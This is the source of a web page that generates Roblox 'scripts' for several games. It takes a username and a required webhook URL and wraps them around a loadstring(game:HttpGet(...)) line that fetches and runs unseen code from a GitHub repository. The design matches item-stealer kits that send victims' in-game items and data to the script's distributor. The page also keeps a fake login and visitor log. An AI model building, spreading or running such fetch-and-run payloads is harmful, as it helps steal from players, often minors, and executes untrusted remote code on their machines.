<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Generator</title>
    <style>
        body {
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            margin: 0;
            position: relative;
        }
        h1 {
            font-size: 3rem;
            animation: fadeIn 1.5s ease-in-out;
        }
        .container {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 20px;
        }
        select {
            background: #333;
            color: white;
            padding: 10px;
            border-radius: 8px;
            font-size: 1rem;
        }
        input {
            background: #333;
            color: white;
            padding: 10px;
            border-radius: 8px;
            font-size: 1rem;
            border: none;
        }
        button {
            background: #ff0080;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            font-size: 1rem;
        }
        button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
        .popup {
            display: none;
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(8px);
        }
        .popup input {
            margin: 10px auto;
            padding: 10px;
            width: 80%;
            border-radius: 8px;
            border: none;
            background-color: #333;
            color: white;
        }
        .popup button {
            background: #ff0080;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            transition: 0.3s;
        }
        .popup button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
        .generated-script {
            background: #1e1e2e;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            max-width: 80%;
            margin: 20px auto;
            display: none;
            text-align: left;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
        }
        .generated-script pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 1.1rem;
            color: #d1d1d1;
        }
        .copy-button {
            background: #0080ff;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
            font-size: 1rem;
        }
        .copy-button:hover {
            background: #005bb5;
        }
        .copy-button:disabled {
            background: #555;
        }
        .log-container {
            position: absolute;
            top: 20px;
            right: 20px;
            background: #333;
            padding: 15px;
            border-radius: 8px;
            width: 300px;
            max-height: 400px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
            color: white;
            display: none;
            overflow-y: auto;
            z-index: 10;
        }
        .log-container h3 {
            margin-top: 0;
        }
        .log-container ul {
            padding: 0;
            list-style: none;
        }
        .log-container li {
            padding: 5px;
            margin-bottom: 5px;
            background: #444;
            border-radius: 4px;
        }
        .logs-button {
            position: absolute;
            top: 20px;
            right: 20px;
            background: #ff0080;
            padding: 6px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 1.2rem;
            color: white;
            z-index: 10;
        }
        .logs-button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
        .login-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(8px);
            z-index: 20;
            display: none;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.8);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
            color: white;
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>Script Generator</h1>

    <div class="login-container" id="login-container">
        <div class="login-box">
            <h2>Login</h2>
            <input type="text" id="username-login" placeholder="Enter Username" />
            <button onclick="login()">Login</button>
        </div>
    </div>

    <div class="container">
        <select id="game-select">
            <option value="Blox Fruits">Blox Fruits</option>
            <option value="Murder Mystery 2">Murder Mystery 2</option>
            <option value="Adopt Me">Adopt Me</option>
            <option value="Pet Simulator 99">Pet Simulator 99</option>
            <option value="Pls Donate">Pls Donate</option>
        </select>
        <input type="text" id="username" placeholder="Username (required)">
        <input type="text" id="webhook" placeholder="Webhook URL (required)">
        <button onclick="generateScript()">Generate Script</button>
    </div>

    <div id="generated-script" class="generated-script">
        <h3>Generated Script</h3>
        <pre id="script-output"></pre>
        <button id="copy-btn" class="copy-button" onclick="copyScript()">Copy All</button>
    </div>

    <div id="log-container" class="log-container">
        <h3>Visitor Logs</h3>
        <ul id="log-list"></ul>
    </div>

    <button id="logs-button" class="logs-button" onclick="toggleLogs()">...</button>

    <script>
        let currentGame = '';
        let visitorLogs = [];
        let isLoggedIn = false;

        const loadstrings = {
            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
        };

        function login() {
            const username = document.getElementById('username-login').value;
            if (username) {
                isLoggedIn = true;
                document.getElementById('login-container').style.display = 'none';
            } else {
                alert('Please enter a username to log in');
            }
        }

        function generateScript() {
            if (!isLoggedIn) {
                alert('You must be logged in first!');
                return;
            }

            let username = document.getElementById('username').value;
            let webhook = document.getElementById('webhook').value;
            let selectedGame = document.getElementById('game-select').value;

            if (username && webhook) {
                let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedGame]}`;
                document.getElementById('script-output').innerText = script;
                document.getElementById('generated-script').style.display = 'block';
                document.getElementById('copy-btn').disabled = false;

                // Add log entry
                visitorLogs.push(`Visitor: ${username} generated script for ${selectedGame} at ${new Date().toLocaleString()}`);
                updateLogs();
            } else {
                alert("Please fill in both the username and webhook!");
            }
        }

        function updateLogs() {
            let logList = document.getElementById('log-list');
            logList.innerHTML = '';
            visitorLogs.forEach(log => {
                let listItem = document.createElement('li');
                listItem.innerText = log;
                logList.appendChild(listItem);
            });
        }

        function toggleLogs() {
            const logContainer = document.getElementById('log-container');
            if (logContainer.style.display === 'none' || logContainer.style.display === '') {
                logContainer.style.display = 'block';
            } else {
                logContainer.style.display = 'none';
            }
        }

        function copyScript() {
            const scriptText = document.getElementById('script-output').innerText;
            const textarea = document.createElement('textarea');
            textarea.value = scriptText;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert("Script copied to clipboard!");
        }

        window.onload = function () {
            document.getElementById('login-container').style.display = 'flex';
        }
    </script>
</body>
</html>
